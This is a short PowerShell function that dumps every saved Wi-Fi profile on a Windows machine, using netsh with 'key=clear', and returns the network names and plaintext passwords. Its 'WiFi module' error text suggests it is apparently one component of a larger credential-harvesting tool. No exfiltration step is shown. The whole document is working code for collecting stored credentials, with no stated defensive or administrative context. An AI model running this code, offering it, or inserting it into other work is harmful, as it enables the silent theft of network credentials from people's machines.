function Get-WifiPasswords {
    try {
        $output = @()
        $wifiProfiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object { $_.Split(":")[1].Trim() }
        
        if (-not $wifiProfiles) { return "No WiFi profiles found" }

        foreach ($profile in $wifiProfiles) {
            try {
                $profileInfo = netsh wlan show profile name="$profile" key=clear
                $password = ($profileInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
                
                $output += "SSID: $profile"
                $output += "Password: $password"
                $output += "---------------------"
            }
            catch {
                $output += "Error processing profile: $profile"
                continue
            }
        }
        
        return ($output -join "`n")
    }
    catch {
        return "Error in WiFi module: $_"
    }
}
